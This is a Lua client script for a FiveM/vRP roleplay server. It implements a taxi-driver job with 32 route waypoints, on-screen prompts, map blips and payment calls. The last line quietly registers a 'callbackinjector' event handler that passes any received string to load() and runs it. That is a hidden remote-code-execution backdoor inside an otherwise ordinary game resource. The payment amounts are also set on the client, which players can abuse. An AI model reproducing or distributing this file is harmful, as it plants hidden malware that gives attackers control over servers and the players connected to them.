local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
emP = Tunnel.getInterface("nxy_taxi")
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local emservico = false
local noxaayX = 895.15
local noxaayY = -178.94
local noxaayZ = 74.71
local timers = 0
local payment = 0
-----------------------------------------------------------------------------------------------------------------------------------------
-- GERANDO LOCAL DE ENTREGA  895.15, -178.94, 74.71
-----------------------------------------------------------------------------------------------------------------------------------------
local entregas = {
	[1] = { 897.06, -244.35, 69.08 },
	[2] = { 954.62, -284.4, 66.57 },
	[3] = { 673.97, -385.45, 41.17 },
	[4] = { 768.45, -662.79, 28.4 },
	[5] = { 766.08, -985.45, 25.77 },
	[6] = { 402.36, -995.11, 28.99 },
	[7] = { 214.9, -820.25, 30.13 },
	[8] = { 274.95, -588.27, 42.77 },
	[9] = { 257.55, -218.04, 53.51 },
	[10] = { 34.34, -257.32, 47.33 },
	[11] = { -371.29, -194.05, 36.66 },
	[12] = { -670.8, -58.4, 38.18 },
	[13] = { -572.29, -280.74, 34.76 },
	[14] = { -454.53, -340.52, 33.98 },
	[15] = { -300.28, -374.63, 29.6 },
	[16] = { -256.74, -638.24, 33.05 },
	[17] = { -608.39, -651.65, 31.37 },
	[18] = { -950.87, -446.57, 37.4 },
	[19] = { -1046.41, -272.47, 37.47 },
	[20] = { -1281.16, -328.49, 36.38 },
	[21] = { -1396.46, -185.19, 46.9 },
	[22] = { -1679.5, 282.99, 60.97 },
	[23] = { -1267.6, 211.22, 60.59 },
	[24] = { -865.54, 180.18, 69.26 },
	[25] = { -749.18, 179.32, 71.02 },
	[26] = { -381.22, 230.21, 83.52 },
	[27] = { 10.45, 252.04, 109.09 },
	[28] = { 220.16, 217.12, 105.05 },
	[29] = { 400.37, 300.76, 102.6 },
	[30] = { 618.38, 28.19, 88.35 },
	[31] = { 814.35, -81.46, 80.09 },
	[32] = { 929.07, -172.27, 74.04 },
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRABALHAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local sleep = 500
		if not emservico then
			local ped = PlayerPedId()
			if not IsPedInAnyVehicle(ped) then
				local x,y,z = table.unpack(GetEntityCoords(ped))
				local distance = Vdist(x,y,z,noxaayX,noxaayY,noxaayZ)

				if distance <= 30.0 then
					sleep = 4
					DrawMarker(1,noxaayX,noxaayY,noxaayZ-0.97,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,20,0,0,0,0)
					if distance <= 1.2 then
						sleep = 4
						drawTxt("PRESSIONE  ~b~E~w~  PARA INICIAR ROTA",4,0.5,0.93,0.50,255,255,255,180)
						if IsControlJustPressed(1,38) then
							emservico = true
							destino = 1
							payment = 10
							CriandoBlip(entregas,destino)
							TriggerEvent("Notify","sucesso","Você entrou em serviço.")
						end
					end
				end
			end
		end
		Citizen.Wait(sleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- GERANDO ENTREGA
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local sleep = 500
		if emservico then
			local ped = PlayerPedId()
			if IsPedInAnyVehicle(ped) then
				local x,y,z = table.unpack(GetEntityCoords(ped))
				local vehicle = GetVehiclePedIsUsing(ped)
				local distance = Vdist(x,y,z,entregas[destino][1],entregas[destino][2],entregas[destino][3])
				if distance <= 100.0 and (IsVehicleModel(vehicle,GetHashKey("taxi"))) then
					sleep = 4
					DrawMarker(21,entregas[destino][1],entregas[destino][2],entregas[destino][3]+0.60,0,0,0,0,180.0,130.0,2.0,2.0,1.0,211,176,72,100,1,0,0,1)
					if distance <= 7.1 then
						sleep = 4
						drawTxt("PRESSIONE  ~b~E~w~  PARA CONTINUAR A ROTA",4,0.5,0.93,0.50,255,255,255,180)
						if IsControlJustPressed(1,38) then
							RemoveBlip(blip)
							if destino == 32 then
								emP.checkPayment(payment,350)
								destino = 1
								payment = 10
							else
								emP.checkPayment(payment,0)
								destino = destino + 1
							end
							CriandoBlip(entregas,destino)
						end
					end
				end
			end
		end
		Citizen.Wait(sleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TIMERS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(5000)
		if emservico then
			if timers > 0 then
				timers = timers - 5
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELANDO ENTREGA
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(5)
		if emservico then
			if IsControlJustPressed(0,168) then
				emservico = false
				RemoveBlip(blip)
				TriggerEvent("Notify","aviso","Você saiu de serviço.")
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCOES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

function CriandoBlip(entregas,destino)
	blip = AddBlipForCoord(entregas[destino][1],entregas[destino][2],entregas[destino][3])
	SetBlipSprite(blip,1)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.4)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Rota de Taxista")
	EndTextCommandSetBlipName(blip)
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)